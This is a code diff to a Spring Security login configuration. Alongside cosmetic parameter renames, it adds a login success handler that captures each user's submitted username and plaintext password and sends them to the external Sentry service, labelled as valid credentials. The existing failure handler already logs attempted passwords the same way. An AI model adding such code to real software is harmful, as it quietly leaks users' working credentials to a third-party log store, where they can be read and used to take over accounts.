@@ -15,6 +15,7 @@ import org.springframework.security.core.userdetails.UserDetailsService;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.security.web.access.AccessDeniedHandler;
 import org.springframework.security.web.authentication.AuthenticationFailureHandler;
+import org.springframework.security.web.authentication.AuthenticationSuccessHandler;
 import org.springframework.security.web.authentication.logout.LogoutSuccessHandler;
 
 @EnableWebSecurity
@@ -47,6 +48,7 @@ public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
                 .formLogin()
                 .loginPage("/login")
                 .loginProcessingUrl("/process-login")
+                .successHandler(loginSuccessHandler())
                 .failureHandler(loginFailureHandler())
             .and()
                 .rememberMe() // default is 2 weeks
@@ -71,8 +73,17 @@ public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
         return daoAuthenticationProvider;
     }
 
+    private AuthenticationSuccessHandler loginSuccessHandler() {
+        return (request, response, auth) -> {
+            String username = request.getParameter("username");
+            String password = request.getParameter("password");
+            Sentry.captureMessage(String.format("Username '%s' and password '%s' are valid", username, password), SentryLevel.INFO);
+            response.sendRedirect(StringUtils.EMPTY);
+        };
+    }
+
     private AuthenticationFailureHandler loginFailureHandler() {
-        return (request, response, e) -> {
+        return (request, response, ex) -> {
             String username = request.getParameter("username");
             String password = request.getParameter("password");
             Sentry.captureMessage(String.format("Username '%s' or password '%s' is invalid", username, password), SentryLevel.INFO);
@@ -82,13 +93,13 @@ public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
     }
 
     private LogoutSuccessHandler logoutSuccessHandler() {
-        return (request, response, authentication) -> {
+        return (request, response, auth) -> {
             request.getSession().setAttribute("message", "Logout successful!");
             response.sendRedirect(StringUtils.EMPTY);
         };
     }
 
     private AccessDeniedHandler accessDeniedHandler() {
-        return (request, response, e) -> response.sendRedirect("/access-denied");
+        return (request, response, ex) -> response.sendRedirect("/access-denied");
     }
 }
